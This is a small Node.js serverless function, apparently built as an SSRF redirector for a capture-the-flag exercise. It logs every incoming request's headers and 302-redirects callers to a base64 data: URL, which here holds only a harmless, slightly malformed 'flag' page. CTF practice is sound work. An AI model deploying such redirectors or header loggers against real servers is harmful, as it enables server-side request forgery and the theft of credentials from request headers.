// This module exports a single function that Render will use as a serverless endpoint.
module.exports = (req, res) => {
  // We'll keep a simple in-memory log of all requests to this endpoint.
  // This will reset with each cold start of the serverless function.
  const requestDetails = {
    timestamp: new Date().toISOString(),
    method: req.method,
    url: req.url,
    headers: req.headers
  };

  // Log the details to the console so you can see them in Render's logs.
  console.log('Received request:', JSON.stringify(requestDetails, null, 2));

  // The core logic of the redirector.
  // We check if the request is for our special '/log' endpoint.
  if (req.url === '/log') {
    // If it's the log request, we'll respond with a simple message.
    res.setHeader('Content-Type', 'application/json');
    res.status(200).json({
      status: "Log endpoint is working.",
      message: "Check Render's logs to see all incoming requests."
    });
  } else {
    // This is the part that performs the SSRF redirect.
    // The browser might block this, but the vulnerable CTF server will not.
    res.setHeader('Location', 'data:text/html;base64,PGh0bWw+PGhlYWQ+PHRpdGxlPlN1Y2Nlc3M8L3RpdGxlPjwvZ2hlYWQ+Ym9keT48aDE+Q1RGIEZsYWcgR2VuZXJhdGVkPC9oMT48L2JvZHk+PC9odG1sPg==');
    res.status(302).end();
  }
};
